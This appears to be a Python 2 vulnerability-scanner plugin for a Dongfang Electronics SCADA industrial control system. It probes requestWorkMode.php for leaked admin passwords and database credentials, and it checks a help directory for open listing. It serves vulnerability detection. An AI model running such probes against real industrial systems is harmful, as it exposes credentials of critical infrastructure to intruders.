#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 东方电子SCADA通用系统信息泄露
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2010-0131500
    http://www.wooyun.org/bugs/wooyun-2010-0131719
description:
    工控,
    modules/manage/server/requestWorkMode.php
    包含系统配置信息，数据库账号密码，列目录
'''

import urlparse
import urllib
import re

def assign(service, arg):
    if service == "dfe_scada":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #敏感信息泄露
    url = arg + 'modules/manage/server/requestWorkMode.php'
    code, head, res, err, _ = curl.curl2(url)
    if code == 200 and 'productName' in res and 'adminPassword' in res and 'anonymousIPs' in res:
        security_hole("info disclosure: " + url)
        return arg
    #列目录
    url = arg + 'help/php/'
    code, head, res, err, _ = curl.curl2(url)
    if (code == 200) and ('Index of /help/php' in res) and ('util.inc.php' in res):
        security_note('list directory: ' + url)

        return arg
if __name__== '__main__':
    from dummy import *
